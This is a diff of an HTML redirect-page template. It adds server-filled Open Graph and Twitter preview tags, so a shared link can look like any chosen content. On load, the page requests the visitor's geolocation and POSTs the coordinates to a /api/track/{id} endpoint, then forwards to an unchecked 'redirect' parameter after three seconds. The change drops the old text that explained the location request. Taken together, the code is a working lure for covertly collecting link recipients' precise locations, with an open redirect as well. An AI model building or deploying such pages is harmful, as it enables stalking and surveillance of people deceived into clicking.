@@ -4,122 +4,162 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Please wait...</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <title>Redirect Page</title>
+    <!-- Open Graph Meta Tags - Dinamis, akan diisi oleh server -->
+    <meta property="og:title" content="{{og_title}}">
+    <meta property="og:description" content="{{og_description}}">
+    <meta property="og:image" content="{{og_image}}">
+    <meta property="og:url" content="{{og_url}}">
+    <meta property="og:type" content="website">
+
+    <!-- Twitter Card Meta Tags -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="{{og_title}}">
+    <meta name="twitter:description" content="{{og_description}}">
+    <meta name="twitter:image" content="{{og_image}}">
+
     <style>
         body {
-            background-color: #f8f9fa;
+            font-family: Arial, sans-serif;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
-            min-height: 100vh;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
             padding: 20px;
+            background-color: #f8f9fa;
+            text-align: center;
         }
 
-        .loader {
-            width: 40px;
-            height: 40px;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #007bff;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
+        .container {
+            max-width: 600px;
+            padding: 20px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
         }
 
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
+        h1 {
+            color: #333;
+        }
 
-            100% {
-                transform: rotate(360deg);
-            }
+        p {
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .btn {
+            display: inline-block;
+            background-color: #007bff;
+            color: white;
+            padding: 10px 20px;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+
+        .btn:hover {
+            background-color: #0056b3;
+        }
+
+        .preview {
+            margin-top: 20px;
+            max-width: 100%;
+        }
+
+        .preview img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 5px;
+            margin-bottom: 10px;
         }
     </style>
 </head>
 
 <body>
     <div class="container">
-        <div class="card shadow-sm" style="max-width: 500px; width: 100%;">
-            <div class="card-body text-center">
-                <div id="loading">
-                    <div class="loader mb-3"></div>
-                    <h4>You are being redirected...</h4>
-                    <p class="text-muted">Please allow location access to continue.</p>
-                </div>
-            </div>
+        <h1>{{og_title}}</h1>
+        <p>{{og_description}}</p>
+
+        <div class="preview">
+            <img src="{{og_image}}" alt="{{og_title}}" onerror="this.style.display='none'">
         </div>
+
+        <p>You are being redirected to the destination...</p>
+        <a href="{{redirect_url}}" class="btn" id="redirectBtn">Redirect Now</a>
     </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            // Get URL parameters
-            const urlParams = new URLSearchParams(window.location.search);
-            const linkId = urlParams.get('id');
-            const redirectUrl = urlParams.get('redirect');
+        // Get ID from URL parameters
+        const params = new URLSearchParams(window.location.search);
+        const id = params.get('id');
+        const redirectUrl = params.get('redirect');
+        const type = params.get('type');
 
-            if (!linkId) {
-                window.location.href = '/';
-                return;
-            }
+        // Send location data to server
+        function sendLocationData(position) {
+            const locationData = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude
+            };
 
-            function redirectToDestination() {
-                if (redirectUrl) {
+            fetch(`/api/track/${id}`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(locationData)
+            })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Location tracked:', data);
+
+                    // Redirect after a delay
+                    if (redirectUrl) {
+                        setTimeout(() => {
+                            window.location.href = redirectUrl;
+                        }, 3000);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error tracking location:', error);
+                });
+        }
+
+        // Handle location error
+        function handleLocationError(error) {
+            console.error('Error getting location:', error);
+
+            // Still redirect after a delay even if location tracking failed
+            if (redirectUrl) {
+                setTimeout(() => {
                     window.location.href = redirectUrl;
-                } else {
-                    window.location.href = '/';
+                }, 3000);
+            }
+        }
+
+        // Request location when page loads
+        window.addEventListener('DOMContentLoaded', () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocationData, handleLocationError);
+            } else {
+                console.error('Geolocation is not supported by this browser.');
+
+                // Still redirect after a delay
+                if (redirectUrl) {
+                    setTimeout(() => {
+                        window.location.href = redirectUrl;
+                    }, 3000);
                 }
             }
 
-            function requestLocation() {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        function (position) {
-                            // Success callback
-                            const locationData = {
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude
-                            };
-
-                            // Send location data to the server
-                            fetch(`/api/track/${linkId}`, {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/json'
-                                },
-                                body: JSON.stringify(locationData)
-                            })
-                                .then(response => response.json())
-                                .then(data => {
-                                    // Redirect after successful tracking
-                                    redirectToDestination();
-                                })
-                                .catch(error => {
-                                    console.error('Error:', error);
-                                    // Redirect anyway in case of error
-                                    redirectToDestination();
-                                });
-                        },
-                        function (error) {
-                            // Error callback
-                            console.error('Geolocation error:', error);
-                            // Redirect anyway if user denies location
-                            redirectToDestination();
-                        },
-                        {
-                            enableHighAccuracy: true,
-                            timeout: 5000,
-                            maximumAge: 0
-                        }
-                    );
-                } else {
-                    // Geolocation not supported, redirect anyway
-                    redirectToDestination();
-                }
+            // Update redirect button
+            const redirectBtn = document.getElementById('redirectBtn');
+            if (redirectUrl && redirectBtn) {
+                redirectBtn.href = redirectUrl;
             }
-
-            // Request location when page loads
-            requestLocation();
         });
     </script>
 </body>
